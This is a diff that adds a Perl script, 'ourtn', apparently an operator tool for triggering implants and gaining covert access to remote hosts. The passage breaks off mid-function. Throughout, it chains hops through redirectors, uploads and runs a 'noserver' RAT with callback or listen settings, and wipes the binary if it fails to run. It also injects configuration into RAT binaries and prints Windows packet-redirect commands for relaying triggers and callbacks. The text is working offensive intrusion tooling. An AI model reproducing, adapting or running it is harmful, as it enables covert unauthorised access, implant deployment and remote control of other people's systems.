@@ -1,0 +1,3289 @@
+#!/usr/bin/env perl 
+# TODO: TARG_AYT when trying to IN a non-IN guy
+use File::Basename ;
+use File::Copy ;
+require Time::Local;
+require "getopts.pl";
+$VER="5.4.0.3" ;
+
+#TODO: Change to ignore error from tipoff if ended in "error: Execute_transmit() failed"
+
+myinit() ;
+$SIG{INT} = \&catch_zap;
+$SIG{TERM} = \&catch_zap;
+
+$ENV{OURTNWINDOW} = "yes" ;
+#process parameters
+@originalparms = @ARGV ;
+
+#add W:<windows ip>  and X:<windows port> 
+#we will need both for this to work
+
+# with windows stuff: "i:p:lcC:dvhD:r:fs:uU:eo:LnNw:S:t:IqQbk:O:PRW:X:T:" ;
+#"i:p:lcC:dvhD:r:fs:uU:eo:LNw:S:t:IqQbk:O:PT:RZ:zW:gBaA:K:HYy:F:V:Em67:nG:0X39:" ;
+# Deprecated: -6 == hector
+$optstr = "i:p:lcC:dvhD:r:fs:uU:eo:LNw:S:t:IqQbk:O:PT:RZ:zW:gBaA:K:HYy:F:V:E7:nG:0X39:5:J:" ;
+processargs() ; # only time called with no argument!
+$scriptoverride = $ENV{SCRIPTOVERRIDE} ;
+
+# replace eoc with just "command"
+# for ftshell, use:
+# add -b dobeforecommand (optional)
+# add -a doaftercommand (optional)
+progprint("$prog @originalparms",$COLOR_SUCCESS,$COLOR_NOTE,
+	 "(v$VER) Called as",STDOUT) unless ($showhelp);
+# find tn.spayed file (unless already have one via -k
+unless ($spayedfile) {
+  @dirs = (".","./tnstuff","../bin","$opbin");
+  @files = ("tn.spayed","tn.spayed.pitches");
+  foreach $file (@files) {
+    foreach $dir (@dirs) {
+      if (-e "$dir/$file") {
+	$spayedfile = "$dir/$file" unless $spayedfile ;
+      }
+    }
+  }
+}
+mymydie("cannot find tn.spayed[.pitches] in any of: @dirs")
+  if (!$spayedfile);
+
+
+if (!$calledbynopen) {
+  if (!$debug and @ARGV and $hopsfile and (-e $hopsfile)) {
+    mywarn ("using command line targets instead of $hopsfile file") ;
+    $hopsfile = "" ;
+  }
+}
+
+if (@ARGV) {
+  @targets = (@ARGV);
+  $hopsfile="" ;
+} else { # must have $hopsfile then
+  $hopsfile = "$opetc/hops.txt" unless $hopsfile ;
+  mymydie("target hopsfile $hopsfile NOT FOUND") unless (-e $hopsfile);
+  mymydie("Cannot use hopsfile with -7--ish tunnel is not hopping.")
+    if $ishtunneltarget ;
+  mywarn("About to proceed via the hopsfile $hopsfile (ignoring #comments):\n",$COLOR_NOTE);
+  open(IN,"< $hopsfile") or mymydie("Unable to open target hopsfile: $hopsfile") ;
+  my $hopcontent="";
+  my @hopcontent = <IN>;
+  $hopcontent = join("",@hopcontent);
+  seek(IN,0,0);
+  print("$COLOR_NOTE$hopcontent\n");
+  my $ans = getinput("Hit RETURN to continue, or ^C/A to abort.$COLOR_NORMAL") unless ($inlab or $nointeraction) ;
+  mymydie("Aborted by user after showing hopsfile.") if ($ans =~ /^a/i);
+  $hopping = " (just opened $hopsfile)" ;
+  my $bigminusc = 0 ;
+  while (<IN>) {
+    chomp ;
+    s/\s*\#.*// ; # remove comments at end of line
+    next if ( /^\#/ or /^\s*$/ ) ;
+    ($hopc,$target,$torr,$port,$args) = /HOP(\d+)[:]*\s+([^: ]+):([TR]*)([^RT\s]*)\s+(.*)/ ;
+    push (@targets,$target) ;
+    push (@hops,$hopc) ;
+    $target{$hopc} = $target ; $tcp{$hopc} = $torr =~ /T/ ; $args{$hopc} = $args ;
+    if (!($torr =~ /R/) and $port) {
+       $port{$hopc} = $port ;
+       $args{$hopc} .= " -O$port" ;
+    }
+    $hops{$target} = $hopc ;
+    # Add pause here somehow for -c callback to allow multiple windows to be established
+    if ($args =~ /-[^-\s]*c/ and $args =~ /-[^-\s]*e/) {  # -c and -e, callback/execute
+      $callback{$target}++;
+      $callback{$hopc}++;
+    }
+    if ($args =~ /-[^-\s]*C/) {
+      mymydie("Only FINAL hop in hops file may use -C") if ($bigminusc++) ;
+    }
+    if ($args =~ /R/) {
+      mymydie("-R requires $opbin/pyside/trigger_ret.py -- not found")
+	unless (-x "$opbin/pyside/trigger_ret.py") ;
+    }
+    if ($args =~ /[AaK]/) {
+      mymydie("-A|a|K requires $opbin/pyside/trigger_side.py -- not found")
+	unless (-x "$opbin/pyside/trigger_side.py") ;
+      mymydie("-A|a|K requires /usr/bin/python -- not found")
+	unless (-x "/usr/bin/python") ;
+    }
+    if ($args =~ /-[^-\s]*7\s*(\S+)/) {
+      $ishtunneltarget = $1 ;
+      @ishtunneltargets = split(/,/,$ishtunneltarget) ;
+    }
+  }
+  close(IN);
+}
+unless ($targets[0]) {
+  mymydie("Bad syntax in hopsfile $hopsfile:\n".`cat $hopsfile`) if $hopsfile ;
+  mymydie("Must provide a target or a hopsfile file. (@targets)") ;
+}
+if ($#targets > 0) {
+  mymydie("Multiple targets do not make sense with -7.") if $ishtunneltarget ;
+  if (!($upload and $executefile) and !@hops) {
+    mymydie("Multiple targets only make sense when both uploading and executing.");
+  }
+  mymydie("Cannot use -C with multiple targets (@targets)") if $callbacktoip ;
+  $multitargets = $#targets ;
+  mymydie("-U not usable with multiple targets (@targets)") if $uploadspecific ;
+  mymydie("-7 not usable with multiple targets (@targets)") if $ishtunneltarget ;
+}
+if ($ishtunneltarget) { # this gets key(s) out of $spayedfile
+  mymydie("Cannot use -7 with -irtun") if $calledbynopen ;
+  foreach my $target (@ishtunneltargets) {
+    push(@targets,$target) ;
+  }
+}
+$ishtunnelkeys = "" ;
+$ishtunnelskip = 0 ;
+foreach $target (@targets) { # Pre-process @targets keys and noservers
+  my $matchresult=0;
+  if ($gottarget{$target}++) {
+    my $hopstring = " in $hopsfile" if $hopsfile ;
+    mymydie("Cannot have duplicate targets, make each unique ($target is duplicated$hopstring)") ;
+  }
+  # Here's where we process args in $hopsfile if we're there
+  if (@hops) {
+    @oldARGV = @ARGV ; # do we need this anymore?
+    @ARGV = split (/\s+/,$args{$hops{$target}}) ;
+    @ARGV = (@originaloptions,split (/\s+/,$args{$hops{$target}})) ;
+    $hopping = " for $target in $hopsfile, HOP$hops{$target}" ;
+    processargs($hopping) ;
+    @ARGV = @oldARGV ;
+  }
+  if($target eq "127.0.0.1"){
+    # First look in $spayedfile
+    unless ($matchresult = findmatch($platformtarget) > 0) {
+      # Failing that, we look in $opbin/varkeys by setting second arg to 1
+      mymydie("No match found in $spayedfile for $platformtarget\n") unless
+	findmatch($platformtarget,1);
+    }
+    $ishactivitywaitsecs = 600 ;
+  } else {
+    # First look in $spayedfile
+    $matchresult = findmatch($target);
+    unless ($matchresult) {
+      # Failing that, we look in $opbin/varkeys by setting second arg to 1
+      $matchresult = findmatch($target,1);
+      mymydie("No match found in $spayedfile or $opbin/varkeys for $target\n") unless
+	$matchresult ;
+    }
+    mywarn("No match found in $spayedfile for $target, but with this trigger that is fine.")
+      if $matchresult < 0;
+  }
+  $ans = "";
+  if ( $#keys > 1) { # remember $keys[0]=""
+    if ($multitargets) {
+      $out = "" ;
+      foreach $tmp (@keylist) {
+        $tmp =~ s/\s+/_/g ;
+	$out .= "$tmp\n";
+      }
+      mymydie("Multiple targets must each have a unique match in tn.spayed, and
+\"$target\" does not:\n($out)\n");
+    }
+    $matchstr = "IP you chose";
+    my $default = $ipindex{$target};
+    $default = 1 unless $default;
+    while ( ! $keys[$ans] ) {
+      if ($default != 1 and $actualtriggerdest) {
+	$ans = $default;
+      } else {
+	print "$prog found several matches in $spayedfile. Choose one: \n";
+	for ($i = 1 ; $i <= $#keys ; $i++) {
+	  print "\t$i)\t$keylist[$i]\n";
+	}
+	$ans = getinput("\nWhich (or \"A\" to abort)?",$default);
+	done() if (uc $ans eq "A")
+      }
+    }
+#  } elsif ($matchresult < 0) {
+
+  } else {
+    $matchstr = "only match found";
+    $ans = 1 ;
+  }
+  $key{$target} = $keys[$ans] ;
+  $ishtunnelkeys .= ",$keys[$ans]" ;
+  $keybits{$target} = $keybits[$ans] ;
+  $keylist{$target} = $keylist[$ans] ;
+  $ip{$target} = $iplist[$ans] ;
+  $childip{$target} = $childiplist[$ans] ;
+  $incver{$target} =$incver[$ans] ;
+  $platform{$target} =$platform[$ans] ;
+  if ($ip{$target}) {
+    if ($ishtunnelskip++) {
+      # we skip the first ip which is the ultimate target
+      # unless user specified ports let tunnel choose
+      $ishcallbackport = "" unless $opt_p ;
+      my $port = $ishcallbackport ;
+      $port = shift(@ishcallbackports) if @ishcallbackports ;
+      $port = ":$port" if ($port > 0) ;
+      $ishtunnelargs1 .= " -tunnel $ip{$target}$port" ;
+      $ishtunnelargs2 .= " -target $ip{$target}" ;
+    }
+    $platform{$target} =~ s/[-_]/\./g ;
+    $platform{$target} =~ s/[-\.]*(\d[\d.]+)\s*$/-\1/ ;
+#    @noservers = split(/\n/,`find /current/up 2>/dev/null | sort | grep noserver.*$platform{$target} | egrep -v "Z$|uu$|bz2$|gz$\"` );
+#    $noserver{$target} = $noservers[$#noservers] ;
+    $noserver{$target} = findnoserver($platform{$target});
+  } else {
+    if (ipcheck($target)) {
+      $ip{$target} = $target;
+    }
+  }
+#dbg("
+#  \$key{$target} = $key{$target} = 
+#  \$ishtunnelkeys .= $ishtunnelkeys .= 
+#  \$keybits{$target} = $keybits{$target} = 
+#  \$keylist{$target} = $keylist{$target} = 
+#  \$ip{$target} = $ip{$target} = 
+#  \$childip{$target} = $childip{$target} = 
+#  \$incver{$target} =$incver{$target} =
+#  \$platform{$target} =$platform{$target} =
+#");
+  $noserver{$target} = $uploadspecific
+    if ($uploadspecific) ;
+  if ($upload and !$uploadspecial) {
+    unless ($noserver{$target} 
+#	    or ($debug and $nopen_mypid and $nopen_mylog)
+	   ) {
+      my $ans = "";
+      my $looped = 0;
+      my $dumdum=0;
+      while (
+	     (!$ans or ! -e $ans)
+	    ) {
+	$ans = "Abort";
+	progprint("No such file. Please re-enter.",STDOUT)
+	  if ($looped++ and !$dumdum);
+	$dumdum=0;
+	my (@IP,%FQDN,%KEYSTR,%OS,%IMPLANTS,
+	    %UTCOFFSET,%ALLIMPLANTKEYS,%IMPLANTKEYS,$val) = () ;
+	if ($val = findinvarkeys($target,0,\@IP,\%FQDN,\%KEYSTR,\%OS,\%IMPLANTS,
+				 \%UTCOFFSET,\%ALLIMPLANTKEYS,\%IMPLANTKEYS)) {
+#	    and $val == 1) {
+	  my $output="";
+	  my (%source,@loc,%gotos,%gotnopen)=();
+	  foreach $ip (@IP) {
+	    my $os = $OS{$ip};
+	    $os =~ s/[-_]/\./g ;
+	    $os =~ s/[-\.]*(\d[\d.]+)\s*$/-\1/ ;
+	    $gotos{$os}++;
+	    if (my $n = findnoserver($os)) {
+#	      dbg("here $ip $os n=$n" );
+	      $gotnopen{$n} = $ip;
+	      $output .= "\t$ip\t$os\t".basename $n;
+	      ($source{$ip}) = $IMPLANTS{$ip} =~ m,(/[^=\s]*),;
+	      $gotos{$n}++;
+	    }
+	  }
+	  my @gotnopen = keys %gotnopen;
+	  my @gotos = keys %gotos;
+	  if (@gotnopen == 1) {
+	    progprint("Found one matching RAT: $gotos[0], so using $gotnopen[0]");
+	    $ans = $gotnopen[0];
+	    $noserver{$target} = $gotnopen[0];
+	    $targetip=$ip;
+	  } else {
+	    progprint("Found multiple potential RATS:\n\t".join("\n\t",@gotnopen));
+	  }
+	}
+#	dbg("val=$val= looking for findinvarkeys($target,1,....)");
+#  foreach $ip (@IP) {
+#    dbg("ip=$ip=
+#FQDN{$ip}=$FQDN{$ip}=
+#KEYSTR{$ip}=$KEYSTR{$ip}=
+#OS{$ip}=$OS{$ip}=
+#IMPLANTS{$ip}=$IMPLANTS{$ip}=
+#UTCOFFSET{$ip}=$UTCOFFSET{$ip}=
+#");
+#  }
+#	foreach $implant (sort keys %ALLIMPLANTKEYS) {
+#	  dbg("IP+IMPLANT $implant key=\"$ALLIMPLANTKEYS{$implant}\"");
+#	}
+#	foreach $implant (sort keys %IMPLANTKEYS) {
+#	  dbg("IMPLANT $implant key=\"$IMPLANTKEYS{$implant}\"");
+#
+#	}
+#	if ($upload and !$uploadspecial) {
+#? No longer need to behave differently here since ftshell uses 
+#? uname to determine upload
+	if ($upload and !$uploadspecial and
+	    (($debug and $calledbynopen) or
+	     $ftshellauto or
+	     !$calledbynopen)
+	   ) {
+	  # We prompt user on first/debug pass, and save that answer
+	  # for the second pass (unless it is to abort).
+	  unless ($noserver{$target} eq $ans) {
+	    unless ($ans and ($gostraightthere or $nointeraction)) {
+	      unless ($ftshellauto) {
+		$ans = getinput("Unable to determine RAT for $target. Enter RAT to use, or \"Abort\"",$ans)
+		  unless ($ans and ($gostraightthere or $nointeraction));
+	      } else {
+		$ans = "viaftshellauto";
+		$uploadfile = "viaftshellauto";
+		progprint("Using new auto-detect method \"-u viaftshellauto\", remote uname will tell ftshell what platform to upload");
+		last;
+	      }
+	    }
+	  }
+	  mymydie("Aborted by user (ans=$ans)") if ($ans =~ /^a/i);
+	  if (-e $ans) {
+	    chomp(my $sum=`sum $ans 2>/dev/null`);
+	    if (`grep "$sum" $opbin/morerats/sums 2>/dev/null`) {
+	      mywarn("NO!\n\nI refuse to upload $ans\n".
+		     "since it came from $opbin/morerats,\n".
+		     "which are CLIENTS (to be used locally), not SERVERS!!");
+	      $dumdum=1;
+	    } else {
+	      if (open(OUT,">$optmp/.ourtn.RAT.$nopen_mypid")) {
+		print OUT $ans;
+		close(OUT);
+	      }
+	    }
+	  }
+	} elsif (! $ftshellauto) {
+	  if (open(IN,"$optmp/.ourtn.RAT.$nopen_mypid")) {
+	    $ans = <IN>;
+	  } else {
+	    mydie("Cannot open $optmp/.ourtn.RAT.$nopen_mypid");
+	  }
+	  close(IN);
+	  unlink("$optmp/.ourtn.RAT.$nopen_mypid");
+	}
+      }
+      $noserver{$target} = $ans;
+      $args{$hops{$target}} .= " -U $noserver{$target}" ;
+    }
+    mymydie("No noserver found for $target ($platform{$target})")
+      unless ($ftshellauto or $noserver{$target} or $uploadspecial) ;
+  }
+#  if (chomp($badrule = `iptables -L -n | egrep "REJECT.*$ip{$target}"`)) {
+#    $badrule =~ s/  / /g ;
+#    mywarn("iptables rule in the way: \n\n$badrule\n");
+#    my $rulefix = "iptables -D OUTPUT --dst $ip{$target} -j REJECT ; iptables -L -n" ;
+#    mymydie("Unable to continue--iptables rule rejects one of the targets. Delete it with:".
+#	  "\n\n$rulefix\n\n");
+#  }
+} # end foreach Pre-process @targets keys
+# OK, that populated these, only for the final @targets entry:
+# @keybits,@keys,@iplist,%ipindex,@keylist,@childiplist,@entry,@offset,@platform
+# and hashes over all of @targets on command line:
+# %key, %keybits, %keylist, %ip, %childip, %platform, %noserver
+
+$ishtunnelkeys =~ s/^,([^,]*),(.*)$/$2,$1/ ;
+$ishtunnelargs = $ishtunnelargs1.$ishtunnelargs2;
+
+# Not dead yet, so start at first target
+$target = $targets[0];
+$platform=$platform{$target} if $platform{$target} ;
+if ($hopping) {
+  # kludge to reset all the $opt* dependent booleans and such to
+  # the first hop, not the last
+  @oldARGV = @ARGV ; # do we need this anymore?
+  @ARGV = (@originaloptions,split (/\s+/,$args{$hops{$target}})) ;
+  $hopping = " for $target in $hopsfile, HOP$hops{$target}" ;
+  processargs($hopping) ;
+  @ARGV = @oldARGV ;
+}
+
+# See if we need to start ftshell or not
+$ftshell = "";
+$ppid = getppid ;
+unless ($binaryupload) {
+  chomp($ans = `ps -efwww | grep " $ppid " | grep ftshell | egrep -v "emacs|grep|vi[m ]"`) ;
+  if (! $ans ) {
+    $ftshell = "ftshell" unless $noftshell;
+  } else {
+    if ($upload) {
+      chomp($ans = `ps -efwww | egrep " $ppid |ftshell|ourtn" | grep -v xemacs | grep -v grep`) ;
+      mymydie("use ourtn alone if you are using -u|U option (do not use ftshell on command line):\n\n$ans\n") ;
+    }
+  }
+  chomp(my $ftshellline = `ftshell -v 2>&1 | egrep "expect|ftshell|chance"`) ;
+  $expectproblem = $ftshellline =~ /expect: not found/ ;
+  ($duh,$duh,$ftshellver) = split(/\s+/,$ftshellline) ;
+  if ($upload) {
+    if ($expectproblem) {
+      mymydie("you must have expect installed to use -u|U|V option");
+    } elsif ($ftshellver eq "chance" or
+	     ((verval($ftshellline))[1] < (verval("3.2"))[1])) {
+      # why chance? because old ftshells said this to -v:
+      # "Did by chance you forget to specify a command to run?"
+      $ftshellver = "a very old one (no version)" if ($ftshellver eq "chance") ;
+      mymydie("Cannot use -u|U|V parameter with ftshell older than v.3.2 (you have $ftshellver).");
+    } elsif ((verval($ftshellline))[1] < (verval("3.10.2.1"))[1]) {
+      mymydie("Must have ftshell v3.10.2.1+ to use -V option") if $uploadspecial ;
+    }
+  }
+}
+
+# ASSERT: OK, if we have multiple unique targets:
+#         * They are unique
+#         * their keys / ips / noservers are in %key and %ip and %noserver
+#         * If hopsfile used each targets args are in %args
+#         * we are not using -7 $ishtunneltarget
+# ASSERT: First (or only) target's stuff is in @keys and @iplist
+if ($multitargets) {
+  my %beenthere = () ;
+  open(OUT, "> $opetc/multitargets") or mymydie("cannot open $opetc/multitargets");
+  foreach $target (@targets[1..$#targets]) { # skip first guy--on him already
+    my $r = myrand();
+    my $thishop = $ip{$target};
+    $thishop = $key{$target}
+      unless $thishop;
+    if ( $args{$hops{$target}} =~ /-[^-\s]*p\s*(\d+)/ ) {
+      $r = $1 ;
+    }
+    print OUT "-irtun $thishop $r $originaloptions $args{$hops{$target}}\n";
+    if ($beenthere{$thishop}++) {
+      $hopping =~ s/ for/at/ ;
+      my $msg = "Dude--you're going in circles ($hopping).\n\n".
+	"You cannot hit the same box twice.\n\n".
+	  "Here is \"$opetc/multitargets\" as built thus far:\n".`cat $opetc/multitargets` ;
+      $hopping = "" ;
+      mymydie($msg) ;
+    }
+  }
+  close(OUT) ;
+  copy("$opetc/multitargets","$opetc/multitargets.orig");
+}
+$key = $key{$target} ;
+$key="dummy" unless $key ;
+if ($platformtarget) {
+  # $targetip needs to be localhost - no trigger needed actually so ground it
+  $targetip = "127.0.0.1" ;
+} else {
+  $targetip = $ip{$target};
+}
+$origtargetip = $targetip ;
+$childip = $childip{$target} ;
+$noserver = $noserver{$target} ;
+if ($childip) {
+  # NATting so $target given may be inside target (childip) or outside ($targetip)
+  progprint("Going to $childip by way of $targetip (maybe via NAT?)",STDOUT);
+} else {
+  if (
+      !$tipofftrigger and
+      !($targetip eq $target) and
+      ipcheck($target)
+     ) {
+    mywarn("WARNING: You entered $target, a valid IP,\n".
+	   "but the $matchstr is $targetip.\n".
+	   "Hit <RETURN> to connect to $targetip or ^C to abort.");
+    $junk = <STDIN> ;
+  }
+}
+$ftshellenv = "";
+unless ($noftshell) {
+  $ftshellargs = " -I";
+  $ftshellargs .= " -9 $ishpath" if ($ishpath) ;
+  $ftshellargs .= " -q" if ($quietish) ;
+  $ftshellargs .= " -B" if ($usebash) ;
+  $ftshellargs .= " -Q" if ($ultraquietish) ;
+  $ftshellargs .= " -L" if ($stayloggedin) ;
+  # ourtn command line args for these next two are opposite from the rest.
+  # That is, for FreeBSD, the defaults are opposite for -m (which) and -E.
+  if ($platform =~ /freebsd/) {
+    $usesetenv = !$usesetenv;
+#    $usewhich = !$usewhich;
+  }
+  $ftshellargs .= " -w" if ($usewhich);
+#  $ftshellargs .= " -E" if ($usesetenv);
+}
+if (! $targetip) {
+  if (!$tipofftrigger) {
+    mymydie("\nNo match found in $spayedfile for $target\n");
+  } elsif (ipcheck($target)) {
+    $targetip = $target;
+  } else {
+    mymydie("\nTarget \"$target\" must be either a valid IP or a host in $spayedfile\n");
+  }
+}
+
+$uploadfile = "" ;
+if ($uploadspecific) {
+  $uploadfile = $uploadspecific ;
+} elsif ($upload and !$uploadspecial) {
+  mymydie("Could not find rat to upload: noserver.*$platform") unless $noserver{$target} or $ftshellauto;
+  $uploadfile = $noserver{$target} ;
+}
+
+if ($uploadfile or $uploadspecial) {
+  if ($uploadfile) {
+    mymydie("$uploadfile does not exist") 
+      unless (-e "$uploadfile" or
+	      $uploadfile eq "viaftshellauto") ;
+    # NOTE: If we are in $binaryupload mode, ftshell args and such set
+    #       here later get ignored.
+
+#-u file -r ratname [-e [-o port] [-C ipaddr] ]
+# NOTE: ftshell is not using getopts--every option must have its own "-"
+    $ftshellargs .= " -u $uploadfile";
+  } elsif ($uploadspecial) {
+#    $ftshellargs .= " -U //$uploadspecial//" ;
+    unlink("$opdir/.ourtn-ftshell-upcommand");
+    open(OUT2,"> $opdir/.ourtn-ftshell-upcommand");
+    print OUT2 $uploadspecial;
+    close(OUT2);
+    $ftshellargs .= " -U ";
+  }
+  $ftshellargs .= " -r $ratname";
+  # NOTE: If in [ultra]quiet ish mode, no need to cd here at all if $workingdir is /tmp
+  $beforecommand = "";
+  if ($ultraquietish or $quietish) {
+    $beforecommand = "$cddir ; pwd " unless (!$cddir or $cddir eq "cd /tmp") ;
+  } elsif ($cddir) {
+    $beforecommand = "$cddir ; ls -arlt | tail " ;
+  } else {
+    $beforecommand = "pwd ; ls -arlt | tail " ;
+  }
+  if ($executefile) {
+    if ($callbackip) {
+      $nopenenv = "D=-uc$callbackip:$nopenport" ;
+      # Take out the following unless--may want delay to tear down something
+      # in middle before the callback.
+      #$nopenenv .= " S=$noservercallbackdelaysecs" unless ($callbackip eq $callbacktoip);
+      $nopenenv .= " S=$noservercallbackdelaysecs" ;
+    } else {
+      if ($executefile) {
+	$targetip = $target if (!$targetip and ipcheck($target)) ;
+	$targetip = "TARGETIP" unless $targetip ;
+	my $nopentarget = $targetip;
+	$nopentarget = $actualtriggerdest
+	  if $actualtriggerdest;
+	if ($calledbynopen) {
+	  $ftshellenv .= " SHOWTHIS=\"-nstun $nopentarget $nopenport\"" ;
+	} else {
+	  $ftshellenv .= " SHOWTHIS=\"$opbin/noclient $nopentarget:$nopenport\"" ;
+	}
+      }
+      $nopenenv = "D=-ul$nopenport" ;
+      $netstat = " netstat -an | grep ${nopenport}.*LISTEN || "
+	unless ($quietish or $ultraquietish);
+    }
+    $nopenenv .= " i=1" if ($travolta) ; # stay alive forever
+    if ($binaryupload) {
+      $nopenenv =~ s/D=//;
+      $nopenenv =~ s/i=1/-i/g;
+      $nopenenv =~ s/S=/-S/g;
+      my ($noprepcmd,$prepoutput) = ();
+      $noprepcmd = "noprep $uploadspecific 2>/dev/null";
+      $prepoutput = `$noprepcmd 2>&1`;
+      # This strips out any escaped color codes
+      $prepoutput =~ s/\033\[\d+;\d+m//g;
+      my ($hexcontentbefore,$asciicontentbefore) = grep { /^::(.*)::\s*$/ }
+	split (/\n/,$prepoutput);
+      ($asciicontentbefore) = $asciicontentbefore =~ /^::(.*)::$/;
+      ($hexcontentbefore) = $hexcontentbefore =~ /^::(.*)::$/;
+      my ($success) = $prepoutput =~ /(File.* is a valid noserver|noprep.*found it at.*bytes)/i;
+
+      mymydie("$uploadspecific is not recognized by noprep as a NOPEN server (or noprep is not in your PATH)")
+	unless $success;
+      unless ($hexcontentbefore =~ /^0{512}$/) {
+	mywarn("Upload file $uploadspecific ALREADY contains noprepped data ($asciicontentbefore)....OVERWRITING THAT with ($nopenenv)");
+      }
+      $noprepcmd = "noprep $uploadspecific $uploadspecific.$targetip $nopenenv 2>/dev/null";
+      progprint("Prepping nopen via:\n$noprepcmd");
+      $prepoutput = `$noprepcmd`;
+      my ($sha1sum) = `sha1sum $uploadspecific.$targetip 2>/dev/null` =~ /(\S+)/;
+      $sha1sum = uc $sha1sum;
+      writefile("APPEND","$opetc/sha1sums","$sha1sum ".gmtime()." [--ThisOp--] $uploadspecific.$targetip");
+      progprint("noprep  OUTPUT: $prepoutput");
+      $prepoutput =~ s/\033\[\d+;\d+m//g;
+      ($success) = $prepoutput =~ /(noprep.*found it at.*bytes|$nopenenv)/i;
+      mymydie("noprep command failed to inject")
+	unless $success;
+      $uploadspecific =  "$uploadspecific.$targetip";
+
+      # Double check results
+      $noprepcmd = "noprep $uploadspecific 2>/dev/null";
+      $prepoutput = `$noprepcmd`;
+      # This strips out any escaped color codes
+      $prepoutput =~ s/\033\[\d+;\d+m//g;
+
+      # Old Perl noprep syntax:
+      my ($hexcontentafter,$asciicontentafter) = grep { /^::(.*)::\s*$/ }
+	split (/\n/,$prepoutput);
+      ($asciicontentafter) = $asciicontentafter =~ /^::(.*)::$/;
+
+      # New Python noprep contains $nopenenv, put it in $asciicontentafter if empty.
+      $asciicontentafter = $success unless $asciicontentafter;
+
+      ($hexcontentafter) = $hexcontentafter =~ /^::(.*)::$/;
+dbg("prepoutput=$prepoutput==      my ($hexcontentafter,$asciicontentafter) = grep { /^::(.*)::\s*$/ }");
+      mymydie("$uploadspecific does not exist after noprep")
+	unless (-s $uploadspecific);
+      mymydie("New noprep content is not correct: ($asciicontentafter) not ($nopenenv)")
+	unless (($asciicontentafter =~ /$nopenenv/));
+    } else {
+      # NOTE: The rm -f here is not needed if the -u in D= actually works, so
+      #       we've changed to now wiping sendmail if it did NOT execute.
+      #       (wiping will still fail on hpux tho.)
+      my $therest = "$dotslash$ratname || cat /dev/null > $ratname" ;
+      #    my $therest = "$dotslash$ratname" ;
+      $therest = "exec ./$ratname" if $execit ;
+      $actualcommand = "chmod 700 $ratname&&$netstat (PATH=. $nopenenv $therest)" ;
+      $actualcommand = "chmod 700 $ratname;PATH=. $nopenenv $therest" if $execit ;
+      if ($usesetenv and !$usebash) {
+	my $mynopenenv = $nopenenv ;
+	$mynopenenv =~ s/([SDiC])=/; setenv $1 /g ;
+	#      $mynopenenv =~ s/set D=(\S+) ;/setenv D $1 ;/ ;
+	$mynopenenv =~ s/^;\s*// ;
+	$actualcommand = "$mynopenenv;chmod 700 $ratname;set path=(. /bin /sbin /usr/bin /usr/sbin);$therest";
+      }
+      $actualcommand .= " ; ls -arlt | tail" unless $execit;
+
+      $ftshellenv .= " A=\"$actualcommand\"" ;
+    }
+  } else {
+    if ($ENV{A}) {
+      $ftshellenv .= " A=\"$ENV{A}\"" ;
+    }
+  }
+  $ftshellenv .= " B=\"$beforecommand\"" if ($beforecommand) ;
+}
+
+if ($windowsredir) {
+  # processargs already made sure I have the required args for windows redirection
+  #   $windowsip $windowsport $winredir=1
+  # assign some new variables.
+  # This is only ever done at command line (not via -irtun) so
+  # it is ok to prompt user here.
+  if ($calledbynopen) {
+    # NEW NEW NEW in 2004! -irtun CAN and does use -W 127.0.0.1:port. That port
+    # is noclient listening for a raw packet wrapped in tcp, and ish is told to
+    # send its trigger (whatever that may be) to that IP:port via this argument.
+    # NEW in 2009: We set both of these so INCISION and all DEWDROP triggers should
+    # now be OK. SIDETRACK? Unix VAL??? Unknown if they are ok.
+    $irtunishparm = "-W $windowsip:$windowsport" ;
+    $tipoffargs .= " --raw-send $windowsip:$windowsport";
+    $winredir = 0;
+  } else {
+    $irtunishparm = "" ;
+    $pitchip = $myip;
+    if (length $ishcallbackip) {
+      $pitchip = $ishcallbackip ;
+    } else {
+      if ($nointeraction) {
+	mywarn("${COLOR_FAILURE}You have IN calling directly back here to $pitchip, instead of to some
+other redirector. $prog is in NOINTERACTION mode, so we are proceeding.") ;
+      } else {
+	getinput("${COLOR_FAILURE}You have IN calling directly back here to $pitchip, instead of to some
+other redirector. If that is what you wanted, hit enter to continue.
+If not, ^C and add   -i WinExtIP   to the command line to send the
+IN calling back to WinExtIP, the far end of the redirection tunnel.$COLOR_NORMAL") ;
+      }
+    }
+    #set the protocol to udp by default
+    $protocol="udp";
+    #select the protocol we are going to redirect (in case it is not udp)
+    if ($tcptrigger) {
+      $protocol="tcp";
+    } elsif ($opt_R) {
+      $protocol="icmp";
+    }
+    # dump out windows box syntax
+    my $nopenbind = " -bind $windowsip" ;
+    my $rawsend = "monitor packetredirect -packettype $protocol -listenport $windowsport$nopenbind" ;
+    my ($tmpnopenport,$nopenlisten,$nopenbind,$nopentarget,$tmpcallwhat) = ($nopenport) ;
+    if ($callbackip) {
+      $nopenlisten = "implantlisten" ;
+      $nopenbind = "" ;
+      $tmpcallwhat = "back" ;
+      $nopentarget = "-target $myip $nopenport" ;
+    } else {
+      $nopenlisten = "lplisten" ;
+      $nopentarget = "-target $targetip $nopenport" ;
+      $tmpcallwhat = "forward" ;
+    }
+    my $nopentunnel = "monitor redirect -tcp -$nopenlisten -listenport $tmpnopenport$nopenbind $nopentarget\n" ;
+    unless ($callbackip) {
+      $tmpnopenport++ ;
+      $nopentunnel .= "monitor redirect -tcp -$nopenlisten -listenport $tmpnopenport$nopenbind $nopentarget\n" ;
+      $tmpnopenport++ ;
+      $nopentunnel .= "monitor redirect -tcp -$nopenlisten -listenport $tmpnopenport$nopenbind $nopentarget\n" ;
+    }
+    my $ishtunnel = "monitor redirect -tcp -implantlisten $ishcallbackport -target $myip $ishcallbackport" ;
+    progprint("Windows box syntax should be:\n\n# raw packetredirect for trigger\n$rawsend\n# redirect(s) for NOPEN call$tmpcallwhat\n$nopentunnel\n# redirect for ish callback\n$ishtunnel\n\n",STDOUT);
+
+    if ($tipofftrigger) {
+      # with -Y/tipoff, we can use --raw-send instead of rc
+      $tipoffargs .= " --raw-send $windowsip:$windowsport";
+    } else {
+      $irtunishparm = "-W $windowsip:$windowsport" ;
+      dbg("NOT calling rc here it is no longer needed, using $irtunishparm instead");
+      # we are going to call rc with $command_rc
+      # build the command string
+      # -D must be last--debug flag
+#      $command_rc = "rc $targetip $pitchip $windowsip $windowsport $protocol -D";
+#dbg("Setting command_rc=$command_rc=");
+#      progprint("targetip $targetip pitchip $pitchip windowsip $windowsip windowsport $windowsport protocol $protocol",STDOUT);
+#      progprint("Debug-would have run rc with: $command_rc",STDOUT) if $debug ;
+      # fork and run rc command when file touched
+#      if (!$debug and !forkit()) {
+#	progprint("Calling rc with pid $$: ".`date -u "+%C%y%m%d-%RZ"`,STDOUT) ;
